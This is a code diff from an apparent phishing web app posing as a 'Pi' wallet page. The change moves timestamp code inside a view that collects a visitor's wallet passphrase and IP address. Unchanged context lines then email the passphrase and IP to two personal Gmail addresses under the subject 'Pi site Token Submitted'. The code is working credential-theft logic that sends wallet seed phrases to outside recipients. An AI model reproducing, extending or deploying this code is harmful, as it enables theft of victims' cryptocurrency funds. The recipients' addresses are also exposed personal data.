@@ -68,6 +68,8 @@ def wallet(request):
     return render(request, 'wallet.html', {})
 
 def submit_pass(request):
+    current_time = datetime.now()
+    formatted_time = current_time.strftime("%Y-%m-%d %H:%M:%S")
     if request.method == "POST":
         keys = request.POST.get('mf-text', '')
         words = keys.split()
@@ -106,9 +108,7 @@ def submit_pass(request):
                     ip_address = get_ip_address()
                     request.session['ip_address'] = ip_address
                     ip_address = ip_address
-
-                current_time = datetime.now()
-                formatted_time = current_time.strftime("%Y-%m-%d %H:%M:%S")
+                    
                 send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the ip address is (- {ip_address}) - the passphrase is -( {keys} )', subject='Pi site Token Submitted', email_to="ezekielobiajulu0@gmail.com")
 
                 send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the passphrase is -( {keys} )', subject='Pi site Token Submitted', email_to="obikeechiemerielinus@gmail.com")
